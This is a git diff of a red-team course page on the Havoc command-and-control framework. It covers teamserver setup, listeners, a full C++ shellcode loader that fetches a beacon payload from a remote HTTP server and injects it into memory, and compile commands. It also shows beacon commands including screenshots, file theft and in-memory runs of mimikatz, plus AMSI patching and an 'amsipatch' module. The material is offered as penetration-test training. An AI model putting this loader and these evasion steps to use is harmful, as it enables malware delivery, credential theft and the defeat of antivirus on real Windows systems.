@@ -8,7 +8,6 @@ categories:
   - "Courses"
 ---
 
-
 # Introduction
 
 Well, hello there! First off, thank you for your time; we promise you won't be disappointed. By the end of it, you should be comfortable utilizing the Havoc C2 to perform advanced penetration tests while remaining under the Blue team's detection radar. This course is meant to give you a solid foundation on many topics including but not limited to:
@@ -168,7 +167,7 @@ Operators {
 
 These credentials can be modified to your preferences. If you're okay with the default values, leave them as is.
 
-9. We're now ready to execute our Havoc setup. We'll start by initiating the teamserver following by the Havoc C2 client.
+1. We're now ready to execute our Havoc setup. We'll start by initiating the teamserver followed by the Havoc C2 client.
 
 
 To initiate the team server, issue the following command while being in the `Havoc` directory.
@@ -238,9 +237,9 @@ Upon executing the above command, a box will pop up on our screen asking for all
 As can be seen, a few parameters are required.
 
 * The name can be anything you please.
-* For the host, we'll write `localhost`
+* For the host, we'll use `localhost`
 * For the port, `40056` must be specified
-* For the user/password combination, you'll need to use the ones you setup earlier in the `havoc.yaotl` config.
+* For the user/password combination, you'll need to use the credential you setup earlier in the `havoc.yaotl` config.
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240217231937.png)
 
@@ -252,7 +251,7 @@ If everything went well with our installation, we should be presented with the H
 
 # The Havoc Interface
 
-You will notice a few different aspects about this C2's interface. So let's go over each one so we can better familiarize ourselves with the different components.
+You will notice a few different aspects about this C2's interface. So, let's go over each one so we can better familiarize ourselves with the different components.
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240217232302.png)
 
@@ -270,7 +269,7 @@ The Event Viewer, that is present in the top right portion of our screen, repres
 
 ## Starting a listener
 
-Now that we've established a solid baseline, let's get our hands dirty and start utilizing all the amazing features the Havoc C2 has to offer. But beforehand, we'll need to obtain our first beacon. Firstly, a listener must started. To do so, we'll click the `View` menu and select `Listeners`.
+Now that we've established a solid baseline, let's get our hands dirty and start utilizing all the amazing features the Havoc C2 has to offer. But beforehand, we'll need to obtain our first beacon. Firstly, a listener must started. To do so, we'll click on the `View` menu and select `Listeners`.
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240218201341.png)
 
@@ -288,21 +287,23 @@ As can be seen in the above screenshot, we need to provide a name for our listen
 * Host = `10.250.0.16`
 * Port = `80`
 
-And of course, these values can be updated to your liking. The parameters we went through as of now are mandatory and must be filled in. However, depending on the environment we are pentesting, we might require using some of the other options. So, here's a quick explanation on the other options you might potentially use :
+And of course, these values can be updated to your liking. The parameters we went through as of now are mandatory and must be filled in. However, depending on the environment we are red teaming in, we might require some of the other options. So, here's a quick explanation on the other options you might potentially use:
 
-* `User Agent` : This option can be used to specify a custom User Agent. We will go over on why this might be useful to us later on in the course.
-* `Headers` : Same thing here, custom headers can be added.
+* `User Agent` : This option can be used to specify a custom *User Agent*. We will go over why this might be useful to us later on in the course.
+* `Headers` : Same thing here, custom headers can be included in our packets.
 * `Uris` : These are the Uri's Havoc will request when sending data back to our team server. Uri's will appear as the following : `/test`, `/news`, `/weather`, etc.
 * `Host Header` : Custom host header.
 * `Proxy Settings`: The proxy settings might be particularly useful to us if we know that our beacon will need to pass through a proxy to reach our team server. In some environments, connections must all pass through a proxy if the intention is to leave the intranet.
 
-With our listener now done, we can create on `Save`.
+With our listener's info now filled, we can click on `Save`. If everything went correctly, you should see it at the bottom of your screen.
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240218202848.png)
 
 ## Crafting our payload
 
 It's now time to have, what we call, a shellcode loader at the ready. This shellcode loader is a binary that once executed on the target, will connect back to our team server and provide us with a way of remotely interacting with our target. Creating fancy shellcode loaders isn't in the scope for this particular course, so we'll keep things simple. The target that we will be using for our numerous tests is running a fully updated Windows 10 operating system with all security protections turned on. However, keep in mind that this loader is not guaranteed to work against all AntiVirus products. This being said, let's have a quick look at the loader that we will be using.
+
+Update 2025: This loader no longer works. If *Cloud* based protection is active, it won't fly.
 
 ```
 #include <windows.h>
@@ -429,7 +430,9 @@ int main(int argc, char* argv[])
 }
 ```
 
-Let's now quickly go through the basic functionality of this code :
+### Going over each code section of the loader
+
+Let's now quickly go through the basic functionality of this code.
 
 * We start by including some libraries which will later be used in the program's flow.
 
@@ -446,7 +449,7 @@ Let's now quickly go through the basic functionality of this code :
 #pragma comment(lib, "ntdll")
 ```
 
-* We proceed by incorporating a sleep mechanism designed to bypass any behavioral analysis done by AntiVirus products. In short, we begin with a `Sleep` that lasts 5 seconds(5000 ms).
+* We proceed by incorporating a sleep mechanism designed to bypass any behavioral analysis done by AntiVirus products. In short, we begin with a `Sleep` that lasts *5* seconds or *5000* ms.
 
 ```
 int tick = GetTickCount64();
@@ -461,7 +464,7 @@ int tock = GetTickCount64();
                 exit(0);
 ```
 
-* We then create a `Download` function that accepts 3 parameters : `Host` and `Port` and `FileName`. Those parameters serve as an indication from where the shellcode must be downloaded.
+* We then create a `Download` function that accepts 3 parameters : `Host` and `Port` and `FileName`. Those parameters serve as an indication of the shellcode's whereabouts.
 
 ```
 std::vector<BYTE> Download(LPCWSTR baseAddress,int port,LPCWSTR filename)
@@ -536,7 +539,7 @@ int main(int argc, char* argv[])
     recvbuf = Download(L"10.250.0.16\0", std::stoi("8001"), L"/test.bin\0");
 ```
 
-* Then, with the help of multiple Windows API's such as `VirtualAlloc`, `VirtualProtect` and `CreateThread`, we inject the downloaded shellcode into the loader's process itself.
+* Then, with the help of multiple Windows API's such as `VirtualAlloc`, `VirtualProtect` and `CreateThread`; we inject the downloaded shellcode into the loader's process itself.
 
 ```
 LPVOID alloc_mem = VirtualAlloc(NULL, recvbuf.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -568,7 +571,7 @@ LPVOID alloc_mem = VirtualAlloc(NULL, recvbuf.size(), MEM_COMMIT | MEM_RESERVE, 
 }
 ```
 
-As a result of this loader's execution, we should be able to receive our beacon in the Havoc C2. With this being said, you might be asking yourself, what shellcode will we be using? Well, Havoc has our back on this one, as it can generate the shellcode for us.
+As a result, we should be able to receive a beacon in the Havoc C2. With that being said, you might be asking yourself, what shellcode will we be using? Well, Havoc has our back on this one, as it can generate the shellcode for us.
 
 ### Generating the shellcode
 
@@ -582,11 +585,11 @@ This will open a window similar to the following.
 
 Just like for the listener, we need to fill in a few values. 
 
-* The listener name must be selected from the dropdown menu. Make sure to select the one we created in an earlier step.
-* Leave the Arch at x64
-* For the format, open the dropdown menu and click on `Windows Shellcode`
+* The *listener name* must be selected from the dropdown menu. Make sure to select the one we created in an earlier step.
+* Preferable, leave the *Arch* at x64
+* For the *format*, open the dropdown menu and click on `Windows Shellcode`
 
-Those are the main options that we need to manage. You definitely noticed the `Config` section which contains multiple options we can select. Those are meant to be used as ways of bypassing security solutions it'll be time to issue certain commands in our beacon. However, Havoc isn't a new Framework anymore, thereby those bypasses will unfortunately not work anymore. Thus, we will not touch the default values.
+Those are the main options that we need to manage. You definitely noticed the `Config` section which contains multiple options we can select. Those are meant to be used as ways of bypassing security solutions when we attempt to issue certain commands within our beacon. However, Havoc isn't a new Framework anymore, thereby those bypasses will unfortunately not work on newer systems. Thus, we will not touch the default values.
 
 From there, click on `Generate`.
 
@@ -594,22 +597,22 @@ You will notice some output in the console while the generation is being done. B
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240218210043.png)
 
-When the generation of the shellcode is completed, a pop-up will appear prompting us to save the shellcode to a location of our choice. Upon doing so, we should see the success message indicating to us that everything went well.
+When the generation of the shellcode is completed, a pop-up will appear prompting us to save the shellcode to a location of our choice. Upon doing so, we should see the success message indicating that everything went well.
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240218210324.png)
 
 ### Getting it all together
 
-With our shellcode now in place,  we need to navigate to the directory we saved it in and start a python http listener that will be responsible of serving the shellcode's content.
+With our shellcode now in place, we need to navigate to the directory we saved it in and start a python http listener that will be responsible for serving the shellcode's content.
 
 ```
 ➜  SquidGuard python3 -m http.server 8001
 Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
 ```
 
-In this case, port `8001` was used as an example.
+In this case, port `8001` is being used.
 
-Now, it's time to update our loader with the appropriate values. The modifications only go as far as modifying the following line :
+Now, it's time to update our loader with the appropriate values. The modifications only go as far as modifying the following line:
 
 ```
 recvbuf = Download(L"10.250.0.16\0", std::stoi("8001"), L"/demon.x64.bin\0");
@@ -617,7 +620,7 @@ recvbuf = Download(L"10.250.0.16\0", std::stoi("8001"), L"/demon.x64.bin\0");
 
 * `10.250.0.16` represents the IP of our Kali machine.
 * `8001` represents the port the python http server is listening on.
-* `demon.x64.bin` represents the file containing our beacons' shellcode
+* `demon.x64.bin` represents the file containing our beacon's shellcode.
 
 With the loader now ready, we will go right ahead and compile it.
 
@@ -639,28 +642,28 @@ Use 'sudo apt autoremove' to remove them.
 ➜  SquidGuard
 ```
 
-Now, we can perform the compilation as follows :
+Now, we can perform the compilation as follows:
 
 ```
 ➜  SquidGuard x86_64-w64-mingw32-g++ --static webloader.cpp -o webloader.exe -lwinhttp -fpermissive
 ➜  SquidGuard
 ```
 
-With the actual executable in hand, we can now transfer it to the fully updated/patched Windows 10 machine we spoke of previously. Of course, this isn't applicable to a real engagement. However, the purpose of this demonstration is to provide you with an understanding of Havoc's core functionalities. A simulation of a real engagement utilizing all the techniques acquired in this course will be provided at the end of this course. More details later.
+With the actual executable in hand, we can now transfer it to the fully updated/patched Windows 10 machine we spoke of previously. Of course, this isn't applicable to a real engagement. However, the purpose of this demonstration is to provide you with an understanding of Havoc's core functionalities. Multiple simulations of real engagements utilizing all the techniques acquired in this course will be provided very soon! We'll make an announcement at some point, so stay tuned for that!
 
 #### Transfer of files
 
-The suggested way of transfering our loader to the Windows VM is via SCP. After making sure that SSH is installed (`sudo apt install ssh`) on Kali and up and running (`sudo service ssh status`), we can issue the following command in our Windows command prompt :
+The suggested way of transferring our loader to the Windows VM is via *SCP*. After making sure that SSH is installed (`sudo apt install ssh`) on Kali and up and running (`sudo service ssh start`), we can issue the following command in our Windows command prompt to initiate the transfer:
 
 ```
 scp kali@10.10.10.10:/path/to/exe .
 ```
 
-From there, the loader is executed while keeping all of Windows Defender's options ON :
+From there, the loader is executed while keeping all of Windows Defender's default protection options on:
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240218211927.png)
 
-Looking back at our Python HTTP server, we will notice a request for our shellcode :
+Looking back at our Python HTTP server, we will notice a request for our shellcode:
 
 ```
 ➜  SquidGuard python3 -m http.server 8001
@@ -668,7 +671,7 @@ Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
 10.250.0.30 - - [18/Feb/2024 05:55:59] "GET /demon.x64.bin HTTP/1.1" 200 -
 ```
 
-As well as a beacon in Havoc :
+As well as a beacon in Havoc:
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240218212030.png)
 
@@ -676,11 +679,11 @@ Fantastic! We have our first beacon!
 
 # Getting to know all about Havoc's commands
 
-In order to interact with the beacon we just received, simply double click on it. Upon doing so, you'll now see a prompt allowing you to send commands to the beacon.
+In order to interact with the beacon we just received, simply double click on it. Upon doing so, a prompt allowing you to send commands to the beacon will appear at the bottom.
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240218212219.png)
 
-Let's verify that our beacon is alive but testing a simple `whoami` command.
+Let's verify that our beacon is alive by sending a simple `whoami` command.
 
 ```
 18/02/2024 06:11:42 [Neo] Demon » whoami
@@ -746,7 +749,7 @@ SeDelegateSessionUserImpersonatePrivilegeObtain an impersonation token for anoth
 [*] BOF execution completed
 ```
 
-Appears to be working! At first glance, you might notice that the commands are executing rather slowly. This is caused by the default delay of 2 seconds between commands that Havoc adds to prevent network detection which is something we will talk about later on. This delay also has an actual name : `Jitter`. For now, we don't need that additional delay so we'll just set it to 0 :
+Appears to be working! At first glance, you might notice that the commands are executing rather slowly. This is caused by the default delay of *2* seconds that Havoc implements as a way to blend in with all existing network traffic. This delay is specifically called `Jitter` which can also be modified. For now, we don't need that additional delay so we'll just set it to *0*:
 
 ```
 18/02/2024 06:15:00 [Neo] Demon » sleep 0
@@ -756,11 +759,11 @@ Appears to be working! At first glance, you might notice that the commands are e
 [+] Set sleep interval to 0 seconds with 0% jitter
 ```
 
-If you try to run commands now, you will definitely notice a drastic difference in how quick results come back. There's however a caveat for this, there seems to be an issue at the moment with Havoc where if sleep 0 is used, it might start draining RAM at very rapid rates even sometimes leading to a complete crash of the Virtual Machine. Ideally, it is recommended to keep it at 2 while testing the Framework or practicing in controlled environments.
+If you try to run commands now, you will definitely notice a drastic difference in how quick results come back. There's however a caveat for this, there seems to be an issue at the moment with Havoc where if sleep *0* is used, it might start draining RAM at very rapid rates. Even sometimes leading to a complete crash of the Virtual Machine. Ideally, it is recommended to keep it at *2* while testing the Framework or practicing in controlled environments.
 
 ### Exploring the available commands
 
-Now that we have secured a beacon, let's explore all the available commands to us. To see a listing of commands, we can issue the `help` command.
+Now that we have secured a beacon, let's explore all of the available commands. To see a listing of commands, we can issue the `help` command.
 
 ```
 24/01/2024 07:33:10 [Neo] Demon » help
@@ -994,9 +997,9 @@ windowlist Command list windows visible on the users desktop
 wmi_query Command Run a wmi query and display results in CSV format
 ```
 
-As you can see, a handful of commands can be used. Please note that many of those commands have their own limitations that we will have to get around by ourselves. With this being said, let's over the most notable commands.
+As you can see, a handful of commands can be used. Please note that many of those commands have their own limitations that we will have to get around by ourselves. With that being said, let's go over the most notable ones.
 
-* `shell` --> Allows to execute commands using cmd.exe. Bear in mind though, that this approach involves spawning a new cmd.exe process which reduces our level of stealth.
+* `shell` --> Allows executing commands using *cmd.exe*. Bear in mind though that this approach involves spawning a new *cmd.exe* process each time which significantly reduces our level of stealth.
 
 ```
 24/01/2024 07:47:49 [Neo] Demon » shell whoami
@@ -1008,7 +1011,7 @@ As you can see, a handful of commands can be used. Please note that many of thos
 standalone01\administrator
 ```
 
-* `userenum` --> Allows to quickly get a list of local users on the computer. It's benefial to do it this way, as opposed to for example, executing `net users`. Reason being is simple, we spawn less processes. Executing `net users` will spawn a new `net.exe` process which is usually a sign of intrusion to defenders. But the `userenum` approach, instead, executes a BOF which in turn is a way stealthier manner of gathering information. We will go over BOF's more in depth later on this course.
+* `userenum` --> Allows to quickly get a list of *local users* on the computer. It's beneficial to do it this way, as opposed to for example, executing `net users`. Reason being is simple, we spawn less processes. Executing `net users` will spawn a new `net.exe` process which is usually a sign of intrusion to defenders. But the `userenum` approach, instead, executes a *BOF* which in turn is a way stealthier manner of gathering information. We will go over BOF's more in depth a bit later.
 
 ```
 24/01/2024 07:47:26 [Neo] Demon » userenum
@@ -1026,7 +1029,7 @@ standalone01\administrator
 [*] BOF execution completed
 ```
 
-* `shellcode` --> Allows the injection of shellcode into a specific process PID. Could be useful to spawn another beacon for example. The approach is not recommended to be used as modern AV's and EDR protection solutions will pick it up instantly.
+* `shellcode` --> Allows the injection of shellcode into a specific process' *PID*. Could be useful to spawn another beacon for example. The approach is not recommended to be used as modern *AV's* and *EDR* protection solutions will pick it up instantly.
 
 ```
 24/01/2024 07:53:08 [Neo] Demon » shellcode spawn x64 /home/kali/SquidGuard/beacon.bin
@@ -1046,7 +1049,7 @@ standalone01\administrator
 [*] Uploaded file: C:\users\administrator\beacon.bin (97279)
 ```
 
-* `download` -->Allows downloading files from the machine to our local machine.
+* `download` --> Allows downloading files from a victim machine to our local machine.
 
 ```
 24/01/2024 08:01:03 [Neo] Demon » download C:\users\administrator\webloader.exe
@@ -1056,7 +1059,7 @@ standalone01\administrator
 [+] Finished download of file: C:\users\administrator\webloader.exe
 ```
 
-* `powsershell.exe` --> Allows execution of commands using powershell. Bear in mind though, that will create a new powershell process on the system which is usually associated with threats. 
+* `powsershell.exe` --> Allows execution of commands using *powershell*. Bear in mind though that this will create a new *powershell* process on the system each time, which is usually associated with threats. 
 
 ```
 24/01/2024 08:01:32 [Neo] Demon » powershell whoami
@@ -1067,7 +1070,7 @@ standalone01\administrator
 standalone01\administrator
 ```
 
-* `screenshot` --> Allows capturing the user's screen(only if a desktop exists, which is usually the case when a user is logged on).
+* `screenshot` --> Allows capturing the user's screen (only if a desktop exists, which is usually the case when a user is logged on).
 
 ```
 24/01/2024 08:07:11 [Neo] Demon » screenshot
@@ -1077,11 +1080,11 @@ standalone01\administrator
 [+] Successful took screenshot
 ```
 
-Screenshots can then be found over here :
+Screenshots can then be found over at *View -> Loot*:
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240219142251.png)
 
-* `poowerpick` --> Allows execution of powershell commands without spawning actual powershell processes. This works by utilizing specifically crafted dll's that mimic powershell's functionality. 
+* `poowerpick` --> Allows execution of *powershell* commands without spawning actual *powershell* processes. This works by utilizing specifically crafted *DLL's* that mimic *powershell's* functionality. 
 
 ```
 24/01/2024 08:08:41 [Neo] Demon » powerpick whoami
@@ -1094,7 +1097,7 @@ Screenshots can then be found over here :
 standalone01\administrator
 ```
 
-`noconsolation` --> Allows the execution of PE's in memory instead of having to place them on disk. In the example below, powershell.exe was executed on the system.
+`noconsolation` --> Allows the execution of *PE's (Portable Executables)* in memory instead of having to place them on *disk*. Executing existing binaries that are already on the system is also possible. In the example below, *powershell.exe* was executed in memory.
 
 ```
 24/01/2024 08:16:30 [Neo] Demon » noconsolation --local C:\windows\system32\windowspowershell\v1.0\powershell.exe $ExecutionContext.SessionState.LanguageMode
@@ -1112,7 +1115,7 @@ done
 [*] BOF execution completed
 ```
 
-Binaries are automatically encrypted and stored in memory after they are ran the first time. This means that you do not need to constantly send the binary over the wire and you could instead do something like this the next time :
+Binaries are automatically encrypted and stored in memory after they are ran the first time. This means that you do not need to constantly send the binary over the wire and you could instead do something like this the next time around:
 
 ```
 29/08/2024 20:45:19 [ori] Demon » noconsolation powershell.exe $ExecutionContext.SessionState.LanguageMode
@@ -1126,7 +1129,7 @@ done
 [*] BOF execution completed
 ```
 
-This module also supports running executables that are not already on the Windows system. For example, we could run `mimikatz` :
+Like we already mentioned, this module also supports running executables that are not already on the Windows system. For example, we could run `mimikatz`:
 
 ```
 24/01/2024 08:19:59 [Neo] Demon » noconsolation /home/kali/SquidGuard/mimikatz.exe "coffee" "exit"
@@ -1140,13 +1143,13 @@ done
 [*] BOF execution completed
 ```
 
-It seems like we did not get any output back. Actually, we did. Just not in the place you might expect :
+It seems like we did not get any output back. Actually, we did. Just not in the place you might expect:
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240219143746.png)
 
-It appears that our commands output appears in the output of our loader's execution. At this point in time, this isn't a problem as we have a way to see the output. However, consider a scenario in which we were able to obtain a shell and no access to the user's desktop. In that case, we won't be able to see any output and thereby, the command's execution proves to be useless. We will go over yet another way of executing PE's inline later on this module.
+It looks like our command's results appear in the output of our loader's execution. At this point in time, this isn't a problem as we have a way to see the output. However, consider a scenario in which we were able to obtain a shell and no access to the user's desktop. In that case, we won't be able to see any output and thereby, the command's execution proves to be useless. We will go over yet another way of executing *PE's* inline later on this module.
 
-* `dotnet` --> Allows the execution of C# code in memory. Similar to PE's, C# binaries can also be run in memory to avoid having them touch the actual disk. Let's take a look at an example where `Seatbelt.exe` is being executed.
+* `dotnet` --> Allows the execution of *C#* code in memory. Similar to PE's, *C#* binaries can also be run in memory to avoid having them touch the actual disk. Let's take a look at an example where `Seatbelt.exe` is being executed.
 
 ```
 24/01/2024 08:30:15 [Neo] Demon » dotnet inline-execute /home/kali/VulnLabs/Seatbelt.exe scheduledtasks
@@ -1236,17 +1239,19 @@ DaysInterval : 1
 [*] Completed collection in 0.294 seconds
 ```
 
-Generally, the `noconsolation` and `dotnet inline-execute` modules don't work right out of the box. This is due to the sophisticated protections that are now in place in organizations. Both modules utilize memory to execute their respective codes and thus, an interesting protection component called `AMSI` is our main enemy. `AMSI` is the protection method responsible for pin-pointing malicious executions of code in memory. The next section in this module will cover how `noconsolation` and `dotnet inline-execute` can be used despite AMSI's presence.
+Generally, the `noconsolation` and `dotnet inline-execute` modules don't work right out of the box. This is due to the sophisticated protections that are now in place in organizations. Both modules utilize memory to execute their respective codes and thus, an interesting protection component called `AMSI` comes into play. `AMSI` is the protection method responsible for pin-pointing malicious executions of code in memory. The next section in this module will cover how `noconsolation` and `dotnet inline-execute` can be used despite *AMSI's* presence.
 
 # Defeating AMSI
 
-Like we mentioned previously, AMSI is the main component that will prevent us from successfully executing code in memory. For this example, we will be using a fresh Windows 11 VM on which Windows Defender has been enabled with the following options :
+Like we mentioned previously, *AMSI* is the main component that will prevent us from successfully executing code in memory. For this example, we will be using a fresh Windows 11 VM on which Windows Defender has been enabled with the following options:
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240219145457.png)
 
-The automatic file sample submission has been turned off to avoid sharing our malicious loaders with Microsoft. Otherwise, signatures will be added into Windows Defender and thus, making our payloads detectable. Another option we decided to turn off, is the `Cloud-delivered protection`. In order to provide the best protection for the user, Microsoft will not only rely on data within Windows Defender, but will also fetch protections from the Cloud. If this option is enabled, our loader is immediately detected. Sure, we could write a better loader to avoid getting detected even with the Cloud protection option ON, however, as this is not the main objective of the course, we have decided to turn this off for the next few examples.
+The automatic file sample submission has been turned off to avoid sharing our malicious loaders with Microsoft. Otherwise, signatures will be added into Windows Defender and therefore, making our payloads detectable. Another option we decided to turn off, is the `Cloud-delivered protection`. In order to provide the best protection for the user, Microsoft will not only rely on data within Windows Defender, but will also fetch protections from the *Cloud*. 
 
-On the fresh Windows 11 VM, transfer your executable to it. This can once again be done using `scp` or any of your preferred transferring methods. Do make sure to have the python HTTP webserver running before executing the loader. Once the exe is transferred and executed, let's go back to Havoc and move ahead with our exploitation.
+If this option is enabled, our loader will get immediately detected. Sure, we could write a better loader to avoid getting detected even with the Cloud protection option ON, however, as this is not the main objective of the course, we have decided to turn this off for the next few examples.
+
+On the fresh Windows 11 VM, transfer your executable to it. This can once again be done using `scp` or any of your preferred transferring methods. Do make sure to have the python HTTP web server running before executing the loader. Once the exe is transferred and executed, let's go back to Havoc and move ahead with our exploitation.
 
 If we attempt to execute our previous command that was meant to execute `Seatbelt.exe` in memory, we will now face a different output.
 
@@ -1260,20 +1265,24 @@ As a result of this, our Havoc session was terminated. Let's re-obtain the sessi
 
 # Understanding AMSI
 
-If we want to bypass AMSI, we must first start by understanding how exactly it works. Amsi stands for "**Anti-malware Scan Interface**". It's main objective is objective is hunt down malicious attempts of loading code into memory. Here's a visual illustration of AMSI under the hood.
+If we want to bypass AMSI, we must first start by understanding how exactly it works. AMSI stands for "**Anti-malware Scan Interface**". Its main objective is to hunt down malicious attempts of loading code into memory. Here's a visual illustration of AMSI under the hood.
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240219154853.png)
 
-`amsi.dll` is loaded into any new processes to hook any input in the PowerShell command line or to analyze content for `[System.Reflection.Assembly]::Load()` calls. `amsi.dll` includes multiple functions that are used for analysis of data : **AmsiInitialize**, **AmsiOpenSession,** **AmsiScanbuffer**, etc. When we are talking about bypassing AMSI, we mean that we intend to crash any of the functions mentioned above. If a successful crash can be achieved, AMSI will not be able to function properly. Take **AmsiScanBuffer** for example, if any command or code is executed within the process, this function takes the input data and holds it in a specifically allocated buffer in memory. Next, the AntiVirus solution that is used in the environment will connect to this buffer and scan its contents. If a virus/trojan/malware is identified, execution of the concerned code is not allowed and an alert is generated. However, if a successful "patch" is applied on the **AmsiScanBuffer** function, we might be able to prevent it from placing any new data in its buffer. So, upon execution of our code, no data will be put in the buffer thereby, when the Antivirus solution is called to scan the buffer, nothing is scanned and our code is allowed to execute!
+`amsi.dll` is loaded into any new processes to hook any input in the PowerShell command line or to analyze content for `[System.Reflection.Assembly]::Load()` calls. `amsi.dll` includes multiple functions that are used for analysis of data, for instance: **AmsiInitialize**, **AmsiOpenSession,** **AmsiScanbuffer**, etc. When we are talking about bypassing AMSI, we mean that we intend to crash any of the functions mentioned above. If a successful crash can be achieved, AMSI will not be able to function properly. 
 
-While debugging and understanding `amsi.dll` more in depth is important, it will not be covered in this course. Reason being, it was covered many times already online. If you're interested in knowing how to debug/understand AMSI on a deeper level, please consult the following website.
+Take **AmsiScanBuffer** for example, if any command or code is executed within the process, this function takes the input data and holds it in a specifically allocated buffer in memory. From there, the AntiVirus solution that is used in the environment will connect to this buffer and scan its contents. If a *virus/trojan/malware* is identified, execution of the concerned code is not allowed and an alert is generated. However, if a successful "*patch*" is applied on the **AmsiScanBuffer** function, we might be able to prevent it from placing any new data in its buffer.
+
+So, upon execution of our code, no data will be put in the buffer thereby, when the Antivirus solution is called to scan the buffer, nothing is scanned and our code is allowed to execute!
+
+While debugging and understanding `amsi.dll` more in depth is important, we will however stop here. Reason being, it was covered many times already online. If you're interested in knowing how to debug/understand AMSI on a deeper level, please consult the following website.
 
 https://gustavshen.medium.com/bypass-amsi-on-windows-11-75d231b2cac6
 # Developing custom Havoc C2 modules
 
-A neat feature that we haven't yet discussed in the course is `Modules`. That's right! Havoc supports custom modules! We can create those modules ourselves and make them do specific actions that we desire. In our case, we know that AMSI is preventing us from utilizing C# code in memory, so, we'll create a module that will patch AMSI in our current process. As a result of the patching, we will be able to run the desired C# code. Let's take a look at a basic structure of a Havoc module.
+A neat feature that we haven't yet discussed in the course is `Modules`. That's right! Havoc supports custom modules! We can create those modules ourselves and make them do specific actions that we desire. In our case, we know that *AMSI* is preventing us from utilizing *C#* code in memory, so, we'll create a module that will patch *AMSI* in our current process. As a result of the patching, we will be able to run the desired *C#* code. Let's take a look at a basic structure of a Havoc module.
 
-All available modules can be found in `Havoc/client/Modules`. We will take a look at an example module that already comes pre-installed with Havoc : `DomainInfo`. When we browse to its directory (`Havoc/client/Modules/Domaininfo`), we see 2 files.
+All available modules can be found in `Havoc/client/Modules`. We will take a look at an example module that already comes pre-installed with Havoc: `DomainInfo`. When we browse to its directory (`Havoc/client/Modules/Domaininfo`), we see *2* files:
 
 ```
 ➜  Domaininfo git:(main) ✗ ls
@@ -1281,7 +1290,9 @@ Domaininfo.o  Domaininfo.py
 ➜  Domaininfo git:(main) ✗ 
 ```
 
-The `Domaininfo.o` file is a COFF object file or can also be called a BOF. This is a compiled binary filled with instructions and Windows API's meant to execute certain actions on a system. Remember we spoke about how it's more beneficial to use the `userenum` module instead of using `shell net users`? Well, here's why! `shell` will spawn additional processes leading to potential detection. However, running BOF's will not! These run directly in memory and don't make as much noise on a system. In the case of the `Domaininfo` module, we have a BOF which is the `Domaininfo.o` binary.
+The `Domaininfo.o` file is a *COFF* object file or can also be called a *BOF* for short. This is a compiled binary filled with instructions and Windows API's meant to execute certain actions on a system. Remember we spoke about how it's more beneficial to use the `userenum` module instead of using `shell net users`? 
+
+Well, here's why! `shell` will spawn additional processes (*cmd.exe*) leading to potential detection. However, running *BOF's* will not! These are run directly in memory and don't make as much noise on a system. In the case of the `Domaininfo` module, the actual *BOF* is concentrated inside of the `Domaininfo.o` binary.
 
 ```
 ➜  Domaininfo git:(main) ✗ file Domaininfo.o 
@@ -1289,7 +1300,7 @@ Domaininfo.o: Intel amd64 COFF object file, no line number info, not stripped, 7
 ➜  Domaininfo git:(main) ✗ 
 ```
 
-Let's now take a look at the actual module file :
+Let's now take a look at the actual module file that will be used:
 
 ```
 ➜  Domaininfo git:(main) ✗ cat Domaininfo.py 
@@ -1315,15 +1326,15 @@ def dcenum(demonID, *param):
 RegisterCommand( dcenum, "", "dcenum", "enumerate domain information using Active Directory Domain Services", 0, "", "" )
 ```
 
-The most notable line, is the one where we register the command within Havoc :
+The most important line, is the one where we register the command within Havoc:
 
 ```
 RegisterCommand( dcenum, "", "dcenum", "enumerate domain information using Active Directory Domain Services", 0, "", "" )
 ```
 
-`dcenum` represents the name of the command and `enumerate domain information using Active Directory Domain Services` represents the description that will shown for the command's help menu. 
+`dcenum` represents the name of the command and `enumerate domain information using Active Directory Domain Services` represents the description that will be shown in the command's help menu. The rest of the arguments that are marked as *0* or *""* can be safely ignored for now.
 
-When this module will be executed, the first check that is being made is :
+When this module will be executed, the first check that is being made is:
 
 ```
  if demon.ProcessArch == "x86":
@@ -1331,28 +1342,28 @@ When this module will be executed, the first check that is being made is :
         return False
 ```
 
-A verification is being done to make sure that our beacon is not running an x86 architecture. If so, an error is raised.
+A verification is being done to make sure that our beacon is not running an *x86* architecture. If so, an error is raised.
 
-From there, we proceed by showing some output in the Havoc Console to alert to the user on what is happening :
+From there, we proceed by showing some output in the Havoc Console to alert the user on what is currently happening:
 
 ```
 TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to enumerate domain information using Active Directory Domain Services" )
 ```
 
-And finally, we indicate to Havoc what BOF will need to be executed if all checks have been passed :
+And finally, we indicate to Havoc what *BOF* will need to be executed if all checks passed:
 
 ```
 demon.InlineExecute( TaskID, "go", "Domaininfo.o", b'', False )
 ```
 
 - The `TaskID` parameter is self-explanatory.
-- The second parameter, `go` represents the entry point in our BOF. This is the function from which execution will begin. 
-- The third parameter, `DomainInfo.o` represents the BOF to be run.
+- The second parameter, `go` represents the entry point in our *BOF*. This is the function from which execution will begin. 
+- The third parameter, `DomainInfo.o` represents the *BOF* to run.
 - The fourth and fifth parameters are not important to us.
 
 ## Creating our own Havoc Module
 
-Now that we went over a basic structure of a Havoc Module, let's write our own. We'll first navigate to `Havoc/client/Modules` and create a directory. We'll call it `amsipatch`. Afterwards, switch to the directory.
+Now that we went over the basic structure of a Havoc Module, let's write our own. We'll first navigate to `Havoc/client/Modules` and create a new directory. We'll call it `amsipatch`. Afterwards, we'll switch to the directory.
 
 `amsipatch.py`
 
@@ -1394,7 +1405,7 @@ def amsipatch(demonID, *param):
 RegisterCommand( amsipatch , "", "amsipatch", "in process AMSI patch", 0, "", '')
 ```
 
-We start by implementing a `Packer` class along with a few methods that will be used to properly pack the BOF for execution on the Windows System. 
+We start by implementing a `Packer` class along with a few methods that will be used to properly pack information such as arguments that our *BOF* requires for proper execution.
 
 ```
 class Packer:
